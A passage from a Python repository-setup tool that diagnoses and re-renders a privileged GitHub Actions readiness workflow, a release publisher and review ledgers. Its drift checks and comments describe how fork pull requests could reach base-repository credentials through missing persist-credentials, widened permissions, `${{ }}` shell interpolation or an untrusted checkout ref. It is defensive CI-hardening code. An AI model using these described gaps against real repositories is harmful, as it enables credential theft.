                            "selects any runner registered to the repository or its organisation — "
                            "the policy guard admits only labelled sets, and the labels are this "
                            "repository's own data, which Tenkai does not invent",
                            "pass --runner-labels '[self-hosted, <OS>, <arch>]'")
        p = ctx.repo / WORKFLOW_PATH
        gate = GuardRegistration.state_of(ctx)
        if not p.is_file():
            if gate == "unregistered":
                return self.row(STAGED,
                                "not installed, and the policy guard has not registered it yet. Writing it now "
                                "would fail both required checks for one cause",
                                "land the guard registration first, then re-run apply")
            return self.row(MISSING, "not installed — this repository publishes no readiness verdict",
                            "render templates/pr-readiness.yml")
        text = p.read_text()
        if not ctx.slug:
            return self.row(BLOCKED, "installed, but this repository's slug could not be read, so the "
                                     "gate predicate cannot be checked",
                            "pass --slug <owner/name>")
        drifts, notes = [], []
        # ANALYSE THE LIVE YAML, NEVER THE COMMENTS. This template carries a long
        # provenance banner that QUOTES the defect it exists to prevent --
        # including the literal `github.repository == \'zheref/hatsu\'` and the word
        # `--gates`. An earlier draft matched those and reported every correctly
        # rendered workflow as drift, which the self-test caught. Every line whose
        # first non-space character is `#` is a comment, in YAML and in the shell
        # inside a `run:` block alike, and none of them is what runs.
        live = "\n".join(l for l in text.splitlines() if not l.lstrip().startswith("#"))
        # THE SILENT-SKIP FAILURE. A workflow gated to another repository's slug
        # is skipped on every event: green tick, no job, no signal, forever.
        # THE FORK LIMB IS HALF THE GUARD, AND IT WAS NEVER CHECKED. Comparing only
        # the slug meant a consumer could delete
        # `&& github.event.pull_request.head.repo.full_name == github.repository`
        # and keep the right slug -- and `diagnose` said ok, while the job became
        # reachable from fork pull requests with a base-repository credential.
        gate_line = ""
        for l in live.splitlines():
            if l.lstrip().startswith("if:") and "github.repository" in l:
                gate_line = l
                break
        if gate_line and "head.repo.full_name == github.repository" not in gate_line:
            drifts.append("the job guard has lost its FORK limb "
                          "(`github.event.pull_request.head.repo.full_name == github.repository`) — "
                          "the job would run on fork pull requests holding a base-repository credential")
        m = re.search(r"github\.repository == '([^']+)'", live)
        if m and m.group(1) != ctx.slug:
            drifts.append(f"gated to '{m.group(1)}', not '{ctx.slug}' — this job is SKIPPED on every "
                          f"event and publishes nothing, with no error anywhere")
        elif not m:
            drifts.append("carries no `github.repository ==` gate predicate")
        # AN UNREADABLE FACT IS NOT A CHANGED FACT. The ruling "unreadable ->
        # hosted" governs RENDERING A NEW FILE. Reused as the drift EXPECTATION it
        # means an offline `apply` reports a correct `self-hosted` as drift and then
        # silently reverts it -- resolving "could not read" toward a write. When the
        # probe could not answer, this limb is reported unchecked and left alone.
        m = re.search(r"runs-on:\s*(\[[^\]]*\]|\S+)", live)
        if ctx.visibility is None:
            notes.append("runner limb unread: `gh` could not answer for this repository, so "
                         "`runs-on` was not compared and will not be rewritten")
        elif m and m.group(1) != ctx.runner["runs_on"]:
            drifts.append(f"runs-on is '{m.group(1)}', but this repository derives "
                          f"'{ctx.runner['runs_on']}' ({ctx.runner['reason']})")
        # A consumer need not carry Hatsu's process guard or dependency block.
        # Both are absent in a freshly scaffolded product. A rendered workflow
        # that invokes the guard unconditionally or has no pin fallback is
        # guaranteed to fail before the verdict, even though its YAML is valid.
        process = ctx.role == ROLE_PROCESS
        required = "true" if process else "false"
        fallback = "false" if process else "true"
        if f"TENKAI_GUARD_REQUIRED: {required}" not in live or \
                'if [ -f .trusted/scripts/workflow_runner_policy_check.rb ]; then' not in live:
            drifts.append("the trusted guard step does not handle this repository's role; "
                          "a consumer without Hatsu's Ruby guard would fail before readiness")
        # Compare the executable step, not snippets somewhere in the workflow.
        # A shell `echo 'if [ -f ... ]; then'` otherwise makes a bare, failing
        # jq invocation appear guarded to a whole-file substring search.
        pin_name = "- name: Read the pinned nen ref from trusted nen/contract.json"
        def pin_block(source):
            blocks = re.split(r"\n(?=\s*- name:)", source)
            return next((block.strip() for block in blocks
                         if any(line.strip() == pin_name for line in block.splitlines())), None)
        expected_live = "\n".join(l for l in self.render(ctx).splitlines()
                                  if not l.lstrip().startswith("#"))
        if pin_block(live) != pin_block(expected_live):
            drifts.append("the Nen pin step differs from Hatsu's current trusted rendering; "
                          "a consumer with no dependency block may fail before readiness")
        # THE INVARIANTS THE TEMPLATE SAYS IT INHERITS. Checking the slug, the
        # runner and the triggers left every security property of a PRIVILEGED,
        # CREDENTIALED workflow unchecked: a rendered file was mutated with the
        # trust boundary inverted, `persist-credentials` dropped, write scopes
        # added, a PR-controlled `${{ }}` put inside a `run:` body, and `--gates`
        # downgraded -- and `diagnose` still said `ok`. In a consumer with no
        # policy guard of its own, THIS IS THE ONLY SAFETY NET the workflow has.
        #
        # `--gates` is matched as the WHOLE ARGUMENT, not as a flag name: the
        # repository's own Ruby guard documents why a substring is not enough --
        # `--gates nen/gates.json` satisfies a substring test and resolves against
        # the PR HEAD checkout, handing the pull request the gate that judges it.
        # MATCH THE INVOCATION, NOT THE FILE. Searching the whole live text meant a
        # decoy -- `echo '--gates "$PWD/.trusted/nen/gates.json"'` beside a real
        # `nen pr ready` call WITHOUT the flag -- read as satisfied. The flag is
        # required on the line that actually runs the verb, or its continuation.
        verdict_call = ""
        vlines = live.splitlines()
        for n, l in enumerate(vlines):
            if "pr ready" in l and "echo" not in l:
                verdict_call = "\n".join(vlines[n:n + 6])
                break
        if not verdict_call:
            drifts.append("no `nen pr ready` invocation was found in the verdict step")
        elif '--gates "$PWD/.trusted/nen/gates.json"' not in verdict_call:
            drifts.append("the verdict step does not pass --gates with the TRUSTED absolute path, so "
                          "nen falls back to the PR head checkout's own gates file — the PR would "
                          "supply the gate that judges it")
        # SCOPE THE TRUSTED-REF CHECK TO ITS OWN STEP BLOCK. A fixed character
        # window reached back into the PRECEDING PR-head checkout step and
        # reported every correct file as inverted -- a false positive that, under
        # `apply`, would have rewritten a good workflow. Steps are split on their
        # own `- name:` boundary instead.
        steps = re.split(r"\n(?=\s*- name:)", live)
        trusted = [b for b in steps if re.search(r"path:\s*\.trusted", b)]
        if not trusted:
            drifts.append("there is no `.trusted` checkout — the guard and the pin would come from "
                          "the pull request's own tree")
        else:
            # ASSERT THE REF POSITIVELY. Rejecting only `pull_request.head` left
            # `github.sha` passing -- and on `pull_request_review`, `github.sha` is
            # PR-controlled, so the "trusted" checkout would be the PR's own tree.
            # The only admitted value is the BASE sha.
            for blk in trusted:
                # `path: .trusted` alone identified the block, so swapping
                # `uses: actions/checkout@...` for an arbitrary action kept the
                # marker and the base ref while running someone else's code.
                if not re.search(r"uses:\s*actions/checkout@", blk):
                    drifts.append("the `.trusted` block is not an `actions/checkout` step — "
                                  "an arbitrary action there runs in the privileged job while "
                                  "still looking like the trusted checkout")
                    break
                ref = re.search(r"ref:\s*(.+)", blk)
                got = ref.group(1).strip() if ref else "(none)"
                if "pull_request.base.sha" not in got:
                    drifts.append(f"the .trusted checkout's ref is {got!r}, not the base sha — "
                                  f"anything else is PR-influenced on at least one admitted trigger, "
                                  f"so the guard judging the PR could be the PR's own copy")
                    break
        # PER CHECKOUT STEP, not a global count. Counting occurrences meant
        # deleting one from a file that happened to carry three still read as
        # "enough", so the step that actually lost its credential guard was
        # invisible. Every `actions/checkout` is asked individually.
        for blk in steps:
            if "actions/checkout" in blk and "persist-credentials: false" not in blk:
                name = re.search(r"- name:\s*(.+)", blk)
                drifts.append(f"a checkout step is missing `persist-credentials: false` "
                              f"({name.group(1).strip() if name else 'unnamed'}), leaving a "
                              f"credential in the workspace of a pull_request_target job")
        # EVERY VALID YAML FORM, not one indentation of one shape. `write-all`, an
        # inline mapping `permissions: { contents: write }` and a differently
        # indented block all previously produced no drift at all.
        # `[ \t]*`, never `\s*`: `\s` matches a NEWLINE, so the match began on an
        # earlier line and every offset computed from it was wrong -- which flagged
        # `checks: write`, the one permission that is allowed.
        # EVERY `permissions:` MAPPING, not the first. A job-level block under
        # `jobs.readiness` OVERRIDES the workflow-level one, so a consumer could
        # leave the top block pristine and widen the job. Each is judged.
        for m_perm in re.finditer(r"^[ \t]*permissions:[ \t]*(.*)$", live, re.M):
            inline = m_perm.group(1).strip()
            bad = []
            if inline and not inline.startswith("#"):
                if inline in ("write-all",) or "write" in inline and "{" not in inline:
                    bad.append(inline)                       # permissions: write-all
                elif inline.startswith("{"):
                    bad += [seg.strip() for seg in inline.strip("{}").split(",")
                            if "write" in seg and not seg.strip().startswith("checks:")]
            else:
                start = live[:m_perm.start()].count("\n") + 1
                body = live.splitlines()[start:]
                for l in body:
                    if l.strip() and not l.startswith((" ", "\t")):
                        break
                    if "write" in l and not l.strip().startswith("checks:"):
                        bad.append(l.strip())
            if bad:
                drifts.append(f"a permissions block grants write beyond `checks`: {', '.join(bad)} — "
                              f"a pull_request_target job holds a base-repository credential")
        # EVERY SCALAR FORM. Only `run: |` was parsed, so `run: >` and an inline
        # `run: echo "${{ ... }}"` interpolated PR-controlled text into the shell
        # of the credentialed job without producing any drift.
        run_blocks = re.findall(r"run:\s*[|>][-+]?\s*\n((?:[ \t]+.*\n)+)", live)
        run_blocks += [m for m in re.findall(r"run:[ \t]+(?![|>])(.+)", live)]
        for blk in run_blocks:
            if "${{" in blk:
                drifts.append("a `run:` body interpolates `${{ }}` — PR-controlled text would reach "
                              "the runner's shell; pass it through `env:` instead")
                break
        if "@@" in text:
            drifts.append("still carries unsubstituted @@TOKEN@@ placeholders")
        # THE TRIGGER SET, IN BOTH DIRECTIONS. A missing trigger is the
        # single-trigger bug; an extra one is outside the admitted closed set.
        # PARSE THE `on:` BLOCK, NEVER MATCH AGAINST A LIST OF KNOWN EVENTS. An
        # earlier draft intersected the found keys with a hand-kept allowlist of
        # event names, which meant any event NOT on that list was silently
        # dropped instead of flagged -- so the one case that matters most, an
        # unrecognised trigger, was the one case it could not see. The self-test
        # caught it on `pull_request_review_thread`. Taking every key inside the
        # block has no list to fall out of date.
        declared = _on_keys(live)
        if declared is None:
            drifts.append("the `on:` block could not be parsed, so the trigger set was NOT checked")
            declared = set(REQUIRED_TRIGGERS)
        absent = [t for t in REQUIRED_TRIGGERS if t not in declared]
        if absent:
            drifts.append(f"does not declare {', '.join(absent)} — with pull_request_target alone the "
                          f"verdict is computed at push time while checks are still pending and is "
                          f"NEVER recomputed, so the `ready` transition is essentially never published")
        extra = sorted(t for t in declared if t not in REQUIRED_TRIGGERS)
        if extra:
            drifts.append(f"declares {', '.join(extra)}, which is outside the admitted privileged "
                          f"trigger set — widening it is a maintainer ruling, not a template variation")
        if drifts:
            return self.row(DRIFT, "; ".join(drifts + notes), "re-render from templates/pr-readiness.yml")
        detail = f"installed, gated to {ctx.slug}, runs-on {ctx.runner['runs_on']}"
        return self.row(SATISFIED, "; ".join([detail] + notes))

    def repair(self, ctx):
        cur = self.detect(ctx)
        if cur["state"] in (SATISFIED, STAGED, BLOCKED):
            return cur
        # NO PLACEHOLDER PREDICATE, EVER. An earlier revision rendered
        # `github.repository == 'UNKNOWN'` when no slug resolved. That predicate is
        # false on every event forever, so the job is skipped silently -- which is
        # the precise failure mode § 5 of the skill exists to prevent, reintroduced
        # by the tool meant to prevent it. The `@@` guard did not catch it, because
        # the token WAS substituted; it was substituted with a guaranteed-false value.
        if not ctx.slug:
            return self.row(BLOCKED,
                            "no slug resolves for this repository, and a workflow rendered with a "
                            "placeholder predicate is SKIPPED on every event, forever",
                            "pass --slug <owner/name>")
        p = ctx.repo / WORKFLOW_PATH
        # SOMEBODY ELSE'S WORKFLOW IS SOMEBODY ELSE'S -- the same rule the hook item
        # carried and this one did not. A hand-written pr-readiness.yml was silently
        # replaced by 367 rendered lines, unrecoverable when untracked.
        if p.is_file() and self.MARKER not in p.read_text():
            return self.row(DRIFT,
                            "a pr-readiness.yml is installed that Tenkai did not render — "
                            "it will not be overwritten",
                            "review by hand, then delete it and re-run apply")
        keep = None
        if ctx.visibility is None and p.is_file():
            m = re.search(r"runs-on:\s*(\[[^\]]*\]|\S+)",
                          "\n".join(l for l in p.read_text().splitlines()
                                    if not l.lstrip().startswith("#")))
            keep = m.group(1) if m else None
        p.parent.mkdir(parents=True, exist_ok=True)
        _atomic_write(p, self.render(ctx, keep_runs_on=keep))
        shown = keep or ctx.runner["runs_on"]
        note = " (runner preserved — the probe could not answer)" if keep else ""
        return self.row(REPAIRED, f"rendered for {ctx.slug}, runs-on {shown}{note}")


class ReleasePublisher(Item):
    """Hatsu's to render, for a PROCESS repository only.

    A product repository publishes however its own stack publishes; Tenkai has
    no opinion there and asserts none. A process/system repository's releases
    are consumed by other repositories, so it needs a publisher that exists.
    """

    REL = "scripts/release-publish.sh"
    MARKER = "RENDERED BY hatsu:tenkai from `templates/release-publish.sh`"

    def __init__(self):
        super().__init__(self.REL, "the release publisher mugetsu's declared row runs", "hatsu")

    def detect(self, ctx):
        if ctx.role is None:
            return self.row(BLOCKED,
                            "this repository's role is not recorded — `nen/repos.json` names it "
                            "under neither `maintained_tools` (process/system) nor `consumers` "
                            "(product), and Tenkai does not classify a repository for itself",
                            "record it in nen/repos.json, then re-run")
        if ctx.role != ROLE_PROCESS:
            return self.row(SATISFIED,
                            "the generic process-repository publisher is not installed in a "
                            "product; product lane release rows audit each destination")
        p = ctx.repo / self.REL
        if p.is_symlink():
            return self.row(BLOCKED, f"{self.REL} is a symlink — Tenkai does not follow one out of "
                                     f"the repository it was pointed at",
                            "replace it with a regular file")
        if not p.is_file():
            return self.row(MISSING,
                            "absent — a process/system repository whose releases other repositories "
                            "consume has no publisher for `nen shu release` to run",
                            "render templates/release-publish.sh")
        have = p.read_text()
        if self.MARKER not in have:
            return self.row(DRIFT,
                            "a release-publish.sh is present that Tenkai did not render — "
                            "it will not be overwritten",
                            "review by hand, then delete it and re-run apply")
        # THE MARKER PROVES PROVENANCE, NOT CURRENCY. A publisher rendered three
        # versions ago keeps the marker forever, so marker-only meant a stale
        # engine was reported satisfied and no later run ever repaired it --
        # precisely the "looks installed and does nothing" class this tool exists
        # to end. The bytes are compared against the shipped template.
        if have != ctx.template("release-publish.sh"):
            return self.row(DRIFT,
                            "the rendered publisher differs from the shipped template — it was "
                            "rendered by an older Tenkai, or hand-edited since",
                            "re-render templates/release-publish.sh")
        return self.row(SATISFIED, "present, and byte-identical to the shipped template")

    def repair(self, ctx):
        cur = self.detect(ctx)
        # A STALE rendering IS repaired; a FOREIGN file is not. The two are
        # different findings and only one of them is Tenkai's to overwrite.
        if cur["state"] in (SATISFIED, BLOCKED):
            return cur
        if cur["state"] == DRIFT and "did not render" in cur["detail"]:
            return cur
        p = ctx.repo / self.REL
        # THE PARENT COUNTS TOO. Checking only the final file left `scripts/`
        # itself: a symlinked directory pointing out of the target meant
        # `mkdir(exist_ok=True)` followed it and the publisher was written
        # OUTSIDE `--repo`. Every directory between the root and the file is
        # asked, not just the leaf.
        rel = Path(self.REL)
        probe = ctx.repo
        for part in rel.parts[:-1]:
            probe = probe / part
            if probe.is_symlink():
                return self.row(BLOCKED,
                                f"{probe.relative_to(ctx.repo)} is a symlinked directory — writing "
                                f"through it would land outside the repository Tenkai was pointed at",
                                "replace it with a real directory")
        p.parent.mkdir(parents=True, exist_ok=True)
        _atomic_write(p, ctx.template("release-publish.sh"))
        p.chmod(0o755)
        return self.row(REPAIRED, f"rendered to {self.REL} — declare it as the lane's `release` row")


class ReleaseRow(Item):
    """nen-owned: DIAGNOSED here, and the row to declare is OFFERED, never written.

    `nen/contract.json` is nen's, and Tenkai's central rule is that it never
    hand-writes a nen-owned declaration. So this item reads the row, and when it
    is a seat on a process/system repository it routes -- handing over the exact
    row to paste, composed from THIS repository's own default lane and declared
    stack rather than from a template's guess.
    """

    def __init__(self):
        super().__init__("release/row", "the lane's `release` row, which mugetsu executes at G3", "nen")

    def detect(self, ctx):
        if ctx.role is None:
            return self.row(BLOCKED,
                            "this repository's role is not recorded in `nen/repos.json` — it names it "
                            "under neither `maintained_tools` nor `consumers`, and Tenkai does not "
                            "classify a repository for itself, so whether a real `release` row is "
                            "owed cannot be derived",
                            "record it under `maintained_tools` or `consumers`, then re-run")
        # ABSENT CONTRACT and DECLARED-BUT-LANELESS are different findings.
        # The first is already routed by the nen/contract.json item above; saying
        # "declare defaultLane" about a file that does not exist would send the
        # maintainer to edit nothing.
        if not (ctx.repo / "nen" / "contract.json").is_file():
            return self.row(ROUTED,
                            "nen/contract.json is absent, so there is no lane to declare a `release` "
                            "row on yet. A process/system repository owes one once the contract exists",
                            f"nen scaffold init --repo {ctx.repo}, then re-run — the release row "
                            f"follows once a lane is declared")
        lane, stack = _default_lane(ctx.repo)
        if lane is None:
            return self.row(BLOCKED,
                            "`project.defaultLane` is not declared, so which lane owes the `release` "
                            "row cannot be derived — nen makes `--lane` required in exactly this "
                            "case, and Tenkai does not pick one on nen's behalf",
                            "declare project.defaultLane, then re-run")
        state = _release_row(ctx.repo)
        if state == "declared":
            return self.row(SATISFIED, f"lane '{lane}' declares a real `release` row")
        if ctx.role == ROLE_PRODUCT:
            why = "absent" if state == "absent" else "an unsupported seat"
            return self.row(ROUTED,
                            f"product lane '{lane}' (stack '{stack}') has {why} for `release`; "
                            "Tenkai cannot call this product release-ready or choose its "
                            "distribution channel",
                            f"choose the product's release destinations, package identity, "
                            f"signing and publisher; declare the executable at "
                            f"project.verbs.{lane}.release in nen/contract.json, then run "
                            "nen schema check --repo <path>. Tenkai never writes this declaration")
        offered = json.dumps({
            "exe": "bash",
            "argv": [ReleasePublisher.REL, "--repo", "."],
        }, indent=2)
        why = ("absent" if state == "absent" else
               "a SEAT — it tells nen there is nothing to run, so `hatsu:mugetsu` has nothing to "
               "execute at G3 and publication happens by hand, outside the machinery")
        return self.row(ROUTED,
                        f"lane '{lane}'"
                        + (f" (stack '{stack}')" if stack else "")
                        + f"'s `release` row is {why}. nen owns this file and Tenkai does not "
                          f"hand-write one",
                        f"declare it at project.verbs.{lane}.release — the row this repository's "
                        f"own lane and stack call for:\n{offered}")

    def repair(self, ctx):
        return self.detect(ctx)   # offered, never written


class LaneVerb(Item):
    """Observe a product lane's declared command, including an honest seat.

    Focused lanes only owe the verbs they declare. The iteration lane also owes
    every verb named in workflow.iteration.checks, even if its row is absent.
    This routes configuration to the owning repository without inventing argv.
    Process releases have their own item above. Product releases are per lane:
    Store and direct-download lanes may have different credentials and gates.
    """

    def __init__(self, lane, verb, row, required=False):
        super().__init__(f"lane/{lane}/{verb}", f"the '{verb}' command on lane '{lane}'", "nen")
        self.lane, self.verb, self.command, self.required = lane, verb, row, required

    def detect(self, ctx):
        if self.command is None:
            if self.verb == "release" and not self.required:
                return self.row(ROUTED,
                                "no product release command or explicit unsupported seat is "
                                "declared on any lane",
                                f"choose the product's release destination, package identity, "
                                f"signing and publisher; declare project.verbs.{self.lane}.release "
                                "or an explicit unsupported seat in nen/contract.json; validate "
                                "with nen schema check --repo <path>")
            return self.row(ROUTED,
                            f"iteration.checks requires '{self.verb}' on lane '{self.lane}', "
                            "but no command is declared",
                            f"declare project.verbs.{self.lane}.{self.verb} in nen/contract.json "
                            "and validate with nen schema check --repo <path>")
        if isinstance(self.command, dict) and "unsupported" in self.command:
            reason = self.command.get("unsupported") or "no reason declared"
            required = "; iteration.checks requires this verb" if self.required else ""
            action = (f"choose this lane's package identity, signing source, destination and "
                      f"publisher; declare project.verbs.{self.lane}.release in nen/contract.json"
                      if self.verb == "release" else
                      f"choose and verify the product command for '{self.verb}' on lane "
                      f"'{self.lane}', or keep this explicit limitation visible; update "
                      f"project.verbs.{self.lane}.{self.verb} in nen/contract.json")
            return self.row(ROUTED,
                            f"declared unsupported: {reason}{required}",
                            action + "; validate with nen schema check --repo <path>")
        def valid_step(step):
            return (isinstance(step, dict)
                    and isinstance(step.get("exe"), str) and bool(step["exe"])
                    and isinstance(step.get("argv"), list)
                    and all(isinstance(arg, str) for arg in step["argv"]))
        command = self.command
        valid_command = (isinstance(command, dict) and (
            valid_step(command) or
            (isinstance(command.get("steps"), list) and bool(command["steps"])
             and all(valid_step(step) for step in command["steps"]))))
        if not valid_command:
            return self.row(ROUTED,
                            "malformed command declaration: expected {exe, argv} or "
                            "{steps: [{exe, argv}, ...]}; Nen cannot execute this row",
                            f"repair project.verbs.{self.lane}.{self.verb} in nen/contract.json; "
                            "validate with nen schema check --repo <path>")
        return self.row(SATISFIED, "executable command declared; nen schema check owns validity")

    def repair(self, ctx):
        return self.detect(ctx)   # nen-owned declaration, never hand-written here


def product_lane_items(ctx):
    """Return the product's declared rows, plus missing iteration checks."""
    if ctx.role != ROLE_PRODUCT:
        return []
    try:
        contract = json.loads((ctx.repo / "nen" / "contract.json").read_text())
        project = contract.get("project") or {}
        lanes = project.get("lanes") or {}
        verbs = project.get("verbs") or {}
        workflow = json.loads((ctx.repo / "nen" / "workflow.json").read_text())
        iteration = workflow.get("iteration") or {}
    except (OSError, ValueError, AttributeError):
        return []   # the declaration items diagnose these defects
    if not isinstance(lanes, dict) or not isinstance(verbs, dict):
        return []
    iteration_lane = iteration.get("lane") or project.get("defaultLane")
    checks = iteration.get("checks") or []
    out = []
    has_release = False
    for lane in sorted(lanes):
        rows = verbs.get(lane) or {}
        if not isinstance(rows, dict):
            continue
        has_release = has_release or "release" in rows
        named = set(rows)
        if lane == iteration_lane and isinstance(checks, list):
            named.update(v for v in checks if isinstance(v, str))
        for verb in sorted(named):
            out.append(LaneVerb(lane, verb, rows.get(verb),
                                required=lane == iteration_lane and verb in checks))
    if not has_release:
        if project.get("defaultLane") in lanes:
            out.append(LaneVerb(project["defaultLane"], "release", None))
        elif lanes:
            out.append(ProductReadiness(
                "workflow/release-destination", "product release destination selected",
                False,
                "no lane declares a release command or seat, and no defaultLane selects "
                "where to route the missing row",
                "ask which declared lane(s) publish this product, then add a release "
                "command or explicit unsupported seat for each selected destination"))
    return out


class ProductReadiness(Item):
    """A declared workflow input that exists but cannot yet do its job."""

    def __init__(self, ident, title, good, detail, action):
        super().__init__(ident, title, "nen")
        self.good, self.detail, self.action = good, detail, action

    def detect(self, ctx):
        return self.row(SATISFIED if self.good else ROUTED, self.detail,
                        None if self.good else self.action)

    def repair(self, ctx):
        return self.detect(ctx)  # all declarations are Nen-owned


class ReviewScopes(Item):
    """A review cannot be routed when the repository declares no scopes."""

    def __init__(self):
        super().__init__("workflow/review-scopes", "scoped local review policy", "consumer configuration")

    def detect(self, ctx):
        path = ctx.repo / "nen" / "workflow.json"
        try:
            workflow = json.loads(path.read_text())
        except (OSError, ValueError):
            return self.row(ROUTED, "review scopes cannot be inspected until nen/workflow.json parses",
                            "repair the workflow declaration through its owning item, then re-diagnose")
        review = workflow.get("review") if isinstance(workflow, dict) else None
        scopes = review.get("scopes") if isinstance(review, dict) else None
        if not isinstance(scopes, dict) or not scopes:
            return self.row(ROUTED, "no review.scopes are declared; Hanten cannot classify a change set",
                            "choose review scopes, personas, paths and budgets in nen/workflow.json; "
                            "validate with nen schema check --repo <path>, then resume Hanten")
        return self.row(SATISFIED, f"{len(scopes)} review scope(s) declared; nen schema check owns validity")

    def repair(self, ctx):
        return self.detect(ctx)  # consumer policy is chosen by its owner


class ReviewLedger(Item):
    """Diagnose the active effort's local review history without resetting it."""

    def __init__(self):
        super().__init__("effort/review-ledger", "Hanten review-cycle ledger", "hanten")

    def detect(self, ctx):
        try:
            branch = subprocess.run(["git", "-C", str(ctx.repo), "branch", "--show-current"],
                                    capture_output=True, text=True, timeout=15)
        except (OSError, subprocess.TimeoutExpired) as exc:
            return self.row(BLOCKED, f"git could not identify the active branch: {exc}",
                            "restore a readable checkout before Hanten reviews")
        if branch.returncode != 0:
            return self.row(BLOCKED, "git could not identify the active branch",
                            "restore a readable checkout before Hanten reviews")
        name = branch.stdout.strip()
        if not name:
            return self.row(SATISFIED, "detached checkout: no active branch review cycle to diagnose")
        try:
            workflow = json.loads((ctx.repo / "nen" / "workflow.json").read_text())
            branch_policy = workflow.get("branch") if isinstance(workflow, dict) else None
            base = branch_policy.get("base", "main") if isinstance(branch_policy, dict) else "main"
        except (OSError, ValueError, AttributeError):
            base = "main"  # the declaration item separately reports an unreadable workflow
        if name == base:
            return self.row(SATISFIED, f"on trunk '{name}': no effort ledger is due")
        ledger_dir = ctx.repo / ".nen" / "hanten"
        slug = name.replace('/', '-')
        pr_candidates = [candidate for candidate in ledger_dir.glob(f"{slug}-pr*.cycle.json")
                         if re.fullmatch(rf"{re.escape(slug)}-pr[1-9][0-9]*\.cycle\.json", candidate.name)]
        if len(pr_candidates) > 1:
            return self.row(ROUTED, f"multiple PR-keyed ledgers exist for branch '{name}'; active PR key is unknown",
                            "Hanten identifies the current PR number and diagnoses its exact ledger; never pick a prior PR's budget")
        expected_pr = int(pr_candidates[0].name.removeprefix(f"{slug}-pr").removesuffix(".cycle.json")) if pr_candidates else None
        path = pr_candidates[0] if pr_candidates else ledger_dir / f"{slug}.cycle.json"
        if not path.is_file():
            return self.row(ROUTED, f"no branch-keyed review ledger for '{name}' at {path}; "
                            "Tenkai cannot establish whether an open PR needs its own key or whether review history was lost",
                            "Hanten identifies the active branch or PR effort key, checks prior review evidence, "
                            "then asks whether this is the first cycle under that exact key; "
                            "only a confirmed first cycle may run hanten_cycle_ledger.sh recover-first "
                            "--confirmed-first-cycle. "
                            "If reviews already ran, restore their ledger without resetting used counts")
        try:
            doc = json.loads(path.read_text())
        except (OSError, ValueError) as exc:
            return self.row(BLOCKED, f"review ledger is unreadable: {exc}",
                            "restore the ledger with its used counts; never initialize over it")
        if (not isinstance(doc, dict) or doc.get("contract") != "hatsu.hanten.cycle/v0.1"
                or doc.get("branch") != name or doc.get("pr") != expected_pr
                or not isinstance(doc.get("reviewers"), dict)):
            return self.row(BLOCKED, "review ledger does not match this branch or has no reviewer counts",
                            "restore the matching ledger with its used counts; never reset the cycle")
        # Match hanten_cycle_ledger.sh's fixed PERSONAS. Its loader refuses a
        # missing row rather than silently minting a fresh reviewer budget.
        # A persona ADDED after the ledger contract shipped (leorio) has no row in
        # an older ledger and could not have run there: absent is tolerated (the
        # loader hydrates it at used 0) ONLY when the ledger never knew him --
        # neither personasAtOpen nor lateHydrated names him, the loader's _knew();
        # a malformed stamp reads as knowing him. Present-but-malformed is BLOCKED.
        late_personas = LATE_REVIEW_PERSONAS

        def knew(persona):
            for key in ("personasAtOpen", "lateHydrated"):
                seen = doc.get(key)
                if seen is not None and (not isinstance(seen, list) or persona in seen):
                    return True
            return False

        for persona in REVIEW_PERSONAS:
            if persona in late_personas and persona not in doc["reviewers"] and not knew(persona):
                continue
            row = doc["reviewers"].get(persona)
            if (not isinstance(row, dict) or type(row.get("used")) is not int
                    or row["used"] < 0 or not isinstance(row.get("invocations"), list)):
                return self.row(BLOCKED, f"review ledger has no valid count for {persona}",
                                "restore the original reviewer history; never mint missing counts")
            outcomes = [entry.get("outcome") if isinstance(entry, dict) else None for entry in row["invocations"]]
            if any(outcome not in ("ran", "skipped-exhausted") for outcome in outcomes) or outcomes.count("ran") != row["used"]:
                return self.row(BLOCKED, f"review ledger has inconsistent count and history for {persona}",
                                "restore the original reviewer history; never reset used counts")
        key = f"PR #{expected_pr}" if expected_pr else "branch"
        return self.row(SATISFIED, f"{key} ledger present for '{name}'; Hanten verifies the active effort key")

    def repair(self, ctx):
        return self.detect(ctx)  # an adoption apply must never mint a review budget


def product_workflow_items(ctx):
    """Inspect the joins between declared lanes and Hatsu's delivery phases.

    The checks use only declared keys, not a guessed stack command. The owning
    skill asks for a real command or an explicit limitation for each routed row.
    """
    if ctx.role != ROLE_PRODUCT:
        return []
    try:
        project = json.loads((ctx.repo / "nen" / "contract.json").read_text()).get("project") or {}
        workflow = json.loads((ctx.repo / "nen" / "workflow.json").read_text())
    except (OSError, ValueError, AttributeError):
        return []  # the declaration rows already report these defects
    if not isinstance(project, dict) or not isinstance(workflow, dict):
        return []
    lanes = project.get("lanes") or {}
    verbs = project.get("verbs") or {}
    iteration = workflow.get("iteration") or {}
    tests = workflow.get("tests") or {}
    if not all(isinstance(v, dict) for v in (lanes, verbs, iteration, tests)):
        return []
    lane = iteration.get("lane") or project.get("defaultLane")
    if not isinstance(lane, str) or lane not in lanes:
        return []  # Nen owns the malformed lane verdict
    rows = verbs.get(lane) or {}
    if not isinstance(rows, dict):
        return []
    out = []
    tools = project.get("toolchain") or {}
    out.append(ProductReadiness(
        "workflow/toolchain", "host prerequisites checked by nen shu tools",
        isinstance(tools, dict) and bool(tools),
        "project.toolchain declares host probes" if tools else
        "no project.toolchain: nen shu tools checks zero programs and cannot certify this host",
        "declare pinned probes for the programs this stack actually invokes in "
        "nen/contract.json; run nen shu tools --repo <path>"))
    selected = []
    for key in ("required", "extra"):
        value = tests.get(key) or []
        if isinstance(value, list):
            selected.extend(v for v in value if isinstance(v, str))
    for verb in ("test", "ui-test"):
        command = rows.get(verb)
        if command is not None and verb not in selected:
            out.append(ProductReadiness(
                f"workflow/test-selection/{verb}", f"{verb} selected for Mukai",
                False, f"lane '{lane}' declares {verb}, but tests.required and tests.extra "
                "never select it; Mukai cannot run it as an impacted suite",
                f"decide whether {verb} belongs in tests.required or tests.extra in "
                "nen/workflow.json; an intentionally scoped-only lane stays separate"))
        if verb in selected and command is None:
            out.append(ProductReadiness(
                f"workflow/test-selection/{verb}", f"{verb} selected for Mukai",
                False, f"tests.required or tests.extra selects {verb}, but lane '{lane}' "
                "declares no such command",
                f"declare project.verbs.{lane}.{verb}, or remove the unsupported "
                "selection with its reason"))
    test_row = rows.get("test") or {}
    if "test" in selected and isinstance(test_row, dict) and test_row and \
            "unsupported" not in test_row:
        artifacts = test_row.get("artifacts") or []
        out.append(ProductReadiness(
            "workflow/test-results", "machine-readable test results for Mukai",
            bool(artifacts),
            "the selected test row names result artifacts" if artifacts else
            "the selected test row declares no artifacts; nen shu test-report cannot read results",
            f"make lane '{lane}' write a Nen-readable test result and name its "
